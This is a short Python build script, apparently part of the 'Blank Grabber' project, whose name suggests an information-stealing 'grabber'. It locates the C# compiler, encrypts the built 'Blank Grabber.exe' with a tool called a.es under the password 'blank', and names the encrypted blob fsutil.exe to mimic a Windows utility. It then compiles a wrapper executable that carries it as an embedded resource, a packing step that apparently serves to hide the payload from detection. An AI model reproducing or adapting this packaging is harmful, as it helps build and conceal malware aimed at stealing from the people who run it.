import subprocess, os, shutil

found = False
os.system('title Locating csc.exe...')
path = subprocess.run('where /r "C:\Program Files (x86)\Microsoft Visual Studio" csc.exe', capture_output= True, shell= True, cwd= os.getenv('userprofile', '.')).stdout.decode().strip().splitlines()
for i in path:
    if os.path.isfile(i):
        found = True
        path = i
        os.system('title Compiling...')
        break
if not found:
    os.system('title Opening Folder...')
    os.system('explorer.exe dist')
    exit()
shutil.copy('a.es', 'dist/a.es')
os.chdir("dist")
os.system('a.es -e -p blank -o fsutil.exe "Blank Grabber.exe"')
os.remove("Blank Grabber.exe")
subprocess.run(f'"{path}" /target:winexe /res:a.es /res:fsutil.exe /out:"Blank Grabber.exe" ../main.cs', capture_output= True, shell= True)
os.remove("a.es")
os.remove("fsutil.exe")
os.system('title Opening Folder...')
os.system('explorer.exe .')